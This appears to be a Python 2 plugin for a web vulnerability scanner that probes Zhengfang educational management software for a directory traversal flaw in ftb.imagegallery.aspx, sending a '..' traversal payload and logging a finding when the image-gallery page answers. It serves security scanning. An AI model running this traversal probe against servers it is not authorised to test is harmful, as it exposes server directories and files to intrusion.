#!/usr/bin/python
# -*- coding: utf-8 -*-
from lib.common import *
def run_domain(http,ob):
    try:  
        result=[]
        detail = u"正方教育管理软件的文件ftb.imagegallery.aspx未对'../'进行过滤，导致可以通过‘../’遍历服务器目录和文件。"                                    
        detail = detail.encode('utf8')
        domain=ob['domain']
        url="ftb.imagegallery.aspx?frame=1&rif=..&cif=\.."
        geturl="%s://%s%s%s" % (ob['scheme'],ob['domain'],ob['base_path'],url)
        response,content=requestUrl(http,geturl,ob['task_id'],ob['domain_id'])
        try:
            content=content.decode('gb2312').encode('utf8')
        except UnicodeDecodeError:
            return result
        if content.find("<title>插入图片</title>")>=0:
            request = getRequest(geturl)
            response = getResponse(response)
            result.append(getRecord(ob,geturl,ob['level'],detail,request,response))
    except Exception, e:
        logging.getLogger().error("File:zhengfangdirectorytravescript.py, run_domain function :" + str(e) + ",task id:" + ob['task_id'] + ",domain id:" + ob['domain_id'])
        write_scan_log(ob['task_id'],ob['domain_id'],"File:zhengfangdirectorytravescript.py, run_domain function :" + str(e))
    return result